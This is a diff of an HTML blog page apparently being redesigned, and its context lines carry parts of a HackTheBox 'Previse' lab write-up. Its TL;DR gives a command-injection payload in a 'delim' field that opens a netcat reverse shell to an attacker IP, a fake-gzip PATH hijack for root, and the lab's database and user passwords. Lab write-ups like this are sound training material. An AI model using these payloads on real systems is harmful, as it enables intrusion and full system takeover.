@@ -1,196 +1,36 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en-us">
 <head>
-  
-    <title>Previse - HackTheBox Write-up :: The Red Bay</title>
-  
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Intro Hey all, as promised, I can now spend more time doing some HackTheBox machines since my CISSP studies are behind me and certification is done. Haven&amp;rsquo;t done any in a while so let&amp;rsquo;s kick it off with an easy one.
-This is a Linux based machine, easy, and going to be retired in a few weeks. It&amp;rsquo;s also m4lwhere&amp;rsquo;s first machine so this might be fresh and interesting.
-Before we dig in, this article won&amp;rsquo;t be as detailed as the others." />
-<meta name="keywords" content="" />
-<meta name="robots" content="noodp" />
-<link rel="canonical" href="https://theredbay.net/infosec/htb/htb-previse/" />
-
-
-
-
-<link rel="stylesheet" href="https://theredbay.net/assets/style.css">
-
-  <link rel="stylesheet" href="https://theredbay.net/assets/red.css">
-
-
-
-
-
-
-<link rel="apple-touch-icon" href="https://theredbay.net/img/apple-touch-icon-192x192.png">
-
-  <link rel="shortcut icon" href="https://theredbay.net/img/favicon/red.png">
-
-
-
-<meta name="twitter:card" content="summary" />
-
-  
-    <meta name="twitter:site" content="" />
-  
-    <meta name="twitter:creator" content="redbay" />
-
-
-
-<meta property="og:locale" content="en" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="Previse - HackTheBox Write-up">
-<meta property="og:description" content="Write-up for the &#39;Previse&#39; box from HackTheBox.eu" />
-<meta property="og:url" content="https://theredbay.net/infosec/htb/htb-previse/" />
-<meta property="og:site_name" content="The Red Bay" />
-
-  
-    <meta property="og:image" content="https://theredbay.net/img/favicon/red.png">
-  
-
-<meta property="og:image:width" content="2048">
-<meta property="og:image:height" content="1024">
-
-
-  <meta property="article:published_time" content="2021-12-24 00:00:00 &#43;0000 UTC" />
-
-
-
-
-
-
-
-
-
-
-
-
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Previse</title>
+  <link rel="stylesheet" href="/css/style.css">
 </head>
-<body class="red">
+<body>
+  <div class="container">
+    <nav class="sidebar">
+			<h1>The Red Bay</h1>
 
+			<ul>
+	<a href="/">Home</a>
+	<a href="/projects/">Projects</a>
+	<a href="/infosec/">Infosec</a>
+	<a href="/infosec/htb/">Hack the Box</a>
+	<a href="/misc/">Misc</a>
+	<a href="/about/">About</a>
+</ul>
 
-<div class="container center headings--one-size">
+			<p class="copyright">Copyright 2025. All rights reserved.</p>
 
-  <header class="header">
-  <div class="header__inner">
-    <div class="header__logo">
-      <a href="/">
-  <div class="logo">
-    The Red Bay
-  </div>
-</a>
-
-    </div>
-    
-      <div class="menu-trigger">menu</div>
-    
-  </div>
+    </nav>
+    <main class="content">
+      
   
-    <nav class="menu">
-  <ul class="menu__inner menu__inner--desktop">
-    
-      
-      
-        <ul class="menu__sub-inner">
-          <li class="menu__sub-inner-more-trigger">Menu ▾</li>
-
-          <ul class="menu__sub-inner-more hidden">
-            
-              
-                <li><a href="/about">About</a></li>
-              
-            
-              
-                <li><a href="http://github.com/rebay1982">GitHub</a></li>
-              
-            
-              
-                <li><a href="/infosec">Infosec</a></li>
-              
-            
-              
-                <li><a href="/misc">Misc</a></li>
-              
-            
-          </ul>
-        </ul>
-      
-    
-
-    
-  </ul>
-
-  <ul class="menu__inner menu__inner--mobile">
-    
-      
-        <li><a href="/about">About</a></li>
-      
-    
-      
-        <li><a href="http://github.com/rebay1982">GitHub</a></li>
-      
-    
-      
-        <li><a href="/infosec">Infosec</a></li>
-      
-    
-      
-        <li><a href="/misc">Misc</a></li>
-      
-    
-    
-  </ul>
-</nav>
-
   
-</header>
+	<h1>Previse</h1>
+	<time datetime="2021-12-24T00:00:00&#43;00:00">December 24, 2021</time>
 
-
-  <div class="content">
-    
-<div class="post">
-  <h1 class="post-title">
-    <a href="https://theredbay.net/infosec/htb/htb-previse/">Previse - HackTheBox Write-up</a></h1>
-  <div class="post-meta">
-    
-      <span class="post-date">
-        2021-12-24 
-      </span>
-    
-    
-    <span class="post-author">:: redbay</span>
-    
-  </div>
-
-  
-
-  
-
-  
-    <div class="table-of-contents">
-      <h2>
-        
-          Table of Contents
-        
-      </h2>
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#initial-recon">Initial Recon</a></li>
-    <li><a href="#foothold">Foothold</a></li>
-    <li><a href="#user">User</a></li>
-    <li><a href="#root">Root</a></li>
-    <li><a href="#conclusion">Conclusion</a></li>
-    <li><a href="#tldr">TL;DR</a></li>
-  </ul>
-</nav>
-    </div>
-  
-
-  <div class="post-content"><div>
-        <h1 id="intro">Intro<a href="#intro" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+  <h1 id="intro">Intro</h1>
 <p>Hey all, as promised, I can now spend more time doing some HackTheBox machines since my CISSP
 studies are behind me and certification is done. Haven&rsquo;t done any in a while so let&rsquo;s kick it off
 with an easy one.</p>
@@ -203,7 +43,7 @@ dive in every single command or exploit. By now, it&rsquo;s assumed that the rea
 research if something isn&rsquo;t clear or seems &ldquo;magical&rdquo;. Also, as always, for those in a serious hurry,
 see the <a href="#tldr">TL;DR</a> section at the very end.</p>
 <p>Without further due, let&rsquo;s dive in.</p>
-<h2 id="initial-recon">Initial Recon<a href="#initial-recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="initial-recon">Initial Recon</h2>
 <p>We can add the IP address for the machine in an <code>/etc/hosts</code> entry for convenience&rsquo;s sake. This will
 do the trick</p>
 <pre tabindex="0"><code>sudo echo &#39;10.10.11.104 previse.htb&#39; &gt;&gt; /etc/hosts
@@ -254,7 +94,7 @@ Nmap done: 1 IP address (1 host up) scanned in 44.30 seconds
 </code></pre><p>Alright, we have port <code>22</code> (SSH) and <code>80</code> (HTTP) open. SSH is hinting that we will eventually have
 a password or a private key to log into the machine. HTTP is hinting that the main attack vector
 will be found through a flaw in the hosted web page. Let&rsquo;s start enumeration this host.</p>
-<h3 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h3 id="enumeration">Enumeration</h3>
 <p>First things first, we will enumerate using <code>gobuster</code> and see if we can find something
 interesting hosted on the HTTP server.</p>
 <pre tabindex="0"><code>$ gobuster dir -u &#34;http://previse.htb/&#34; -w ../../tools/http-enum/common.txt
@@ -402,7 +242,7 @@ bad idea. Web sites can contain configuration files that hold credentials used t
 databases. Inadvertently exposing them this way can lead to some serious security issues.</p>
 <p>Anyway, now that we have access to the site&rsquo;s source code, let&rsquo;s see how we can leverage it to get a
 foothold on <code>Previse</code>.</p>
-<h2 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="foothold">Foothold</h2>
 <p>Fast forward 30 minutes, we find a few files of interest.</p>
 <p><code>config.php</code> is one.</p>
 <pre tabindex="0"><code>$ cat config.php
@@ -469,7 +309,7 @@ upon an unpriviledged account with limited access. We can&rsquo;t do much from h
 what we already gathered, it feels like we&rsquo;ll be able to find a password or a way to log into
 <code>Previse</code> through SSH. Remember the <code>config.php</code> file we found earlier? It contains some credentials
 to connect to a database so that will be next on our to do list.</p>
-<h2 id="user">User<a href="#user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="user">User</h2>
 <p>Huge take away from the <code>config.php</code> file is the <code>$mycon = new mysql...</code> line. It hints at a <code>mysql</code>
 database. Before we proceed, we will want to &ldquo;upgrade&rdquo; our shell to a fully interactive TTY shell.</p>
 <pre tabindex="0"><code>python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
@@ -597,7 +437,7 @@ One other best practice to point out here is to not reuse passwords. Obivously, 
 used the same password on the system as the one for the file upload portal, we wouldn&rsquo;t have gotten
 access so easily.</p>
 <p>Let&rsquo;s now move on to <code>root</code>.</p>
-<h2 id="root">Root<a href="#root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="root">Root</h2>
 <p>Now that we have the password to the <code>m4lwhere</code>&rsquo;s user account, we should make a habit out of
 checking <code>sudo -l</code> before  enumerating the machine for privilege escalation. <code>sudo -l</code> lists the
 commands the user can run using <code>sudo</code>. These potentially contain privilege escalation vectors that
@@ -655,7 +495,7 @@ root@previse:~# cat /root/root.txt &gt;&amp;2
 </code></pre><p>The shell is obviously borked and displaying <code>stderr</code>, making the redirect of <code>stdout</code> to <code>stderr</code>
 necessary to see any output from standard commands. If invoking commands from a script, using
 absolute paths instead of relative ones is the key take away here.</p>
-<h2 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="conclusion">Conclusion</h2>
 <p>Well, that was the last one to close out the year. <code>Previse</code> was a first from <code>m4lwhere</code> that proved
 to be enjoyable. The foothold is the most time consuming part because a standard web browser
 withholds valuable information through the redirect on <code>/index.php</code>. Once that was figured out, we
@@ -674,15 +514,15 @@ range and maybe some Windows machines so stay tuned!</p>
 <ul>
 <li>redbay</li>
 </ul>
-<h2 id="tldr">TL;DR<a href="#tldr" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<h3 id="foothold-1">Foothold<a href="#foothold-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h2 id="tldr">TL;DR</h2>
+<h3 id="foothold-1">Foothold</h3>
 <ol>
 <li>Create your user: <code>$ curl -XPOST 'http://previse.htb/accounts.php' --data-raw 'username=redbay&amp;password=redbay&amp;confirm=redbay'</code></li>
 <li>Login: <code>$ curl -XPOST -c - 'http://previse.htb/login.php' --data-raw 'username=redbay&amp;password=redbay'</code></li>
 <li>Setup attacker machine <code>$ nc -lvnp 4445</code></li>
 <li>Reverse shell through <code>$ curl -XPOST 'http://previse.htb/logs.php' -H 'Cookie: PHPSESSID=jg7bi95its9ketrfm5j2ht21q5' --data-raw 'delim=space; nc &lt;attack ip&gt; 4445 -e /bin/bash'</code></li>
 </ol>
-<h3 id="user-1">User<a href="#user-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h3 id="user-1">User</h3>
 <ol>
 <li>Get <code>mysql</code> credentials from <code>/var/www/html/config.php</code></li>
 <li>Log into <code>mysql</code> service: <code>mysql -h localhost -u root --password='mySQL_p@ssw0rd!:)' --database=previse</code></li>
@@ -691,7 +531,7 @@ range and maybe some Windows machines so stay tuned!</p>
 <li>User password: <code>ilovecody112235!</code></li>
 <li>Login through SSH</li>
 </ol>
-<h3 id="root-1">Root<a href="#root-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h3 id="root-1">Root</h3>
 <ol>
 <li><code>echo &quot;/bin/bash 1&gt;&amp;2&quot; &gt; ./gzip</code></li>
 <li><code>chmod 755 ./gzip</code></li>
@@ -699,41 +539,10 @@ range and maybe some Windows machines so stay tuned!</p>
 <li><code>sudo /opt/scripts/access_backup.sh</code></li>
 </ol>
 
-      </div></div>
+  <p class="copyright">Copyright 2025. All rights reserved.</p>
 
-  
 
-  
-
-</div>
-
+    </main>
   </div>
-
-  
-    <footer class="footer">
-  <div class="footer__inner">
-    
-      <div class="copyright copyright--user">
-        <span>Reda Baydoun</span>
-    
-        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
-      </div>
-  </div>
-</footer>
-
-<script src="https://theredbay.net/assets/main.js"></script>
-<script src="https://theredbay.net/assets/prism.js"></script>
-
-
-  <script src="https://theredbay.net/assets/languageSelector.js"></script>
-
-
-
-
-
-
-  
-</div>
-
 </body>
 </html>
